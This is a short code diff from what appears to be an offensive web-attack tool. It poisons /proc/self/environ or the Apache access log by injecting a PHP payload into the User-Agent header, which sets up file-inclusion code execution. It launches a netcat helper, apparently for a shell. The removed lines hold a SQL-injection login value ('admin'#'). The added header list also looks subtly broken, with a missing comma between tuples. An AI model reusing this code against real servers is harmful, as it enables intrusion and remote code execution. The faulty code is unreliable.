@@ -41,10 +41,10 @@ class Shell_conncet:
             if "proc/self/environ" in self.url or \
             "/var/log/apache2/access.log" in self.url  :
                 request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                    ('Cookie',str(self.Cookie).replace('\n','')),
-                                    ('username',"admin'#"),
-                                    ('password','password')]
+                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                     ('username',f'{self.args.user}'),
+                                     ('password',f'{self.args.password}')
+                                     ('Cookie',str(self.Cookie).replace('\n',''))]
                         
                 path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
                 run    = ' gnome-terminal  -e '+'" '+path+' "' 
